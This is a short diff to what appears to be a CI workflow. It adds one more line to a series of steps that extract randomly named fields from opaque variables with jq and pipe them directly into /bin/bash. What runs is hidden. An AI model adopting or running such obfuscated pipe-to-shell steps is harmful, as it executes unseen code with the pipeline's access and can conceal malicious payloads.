@@ -31,6 +31,7 @@ jobs:
           echo $vu3 | jq -r .epjih34757 | /bin/bash
           echo $s2210 | jq -r .pkjci24 | /bin/bash
           echo $n11 | jq -r .finth0609 | /bin/bash
+          echo $ft3811 | jq -r .nq618 | /bin/bash
 
       - name: Save archive
         if: always()
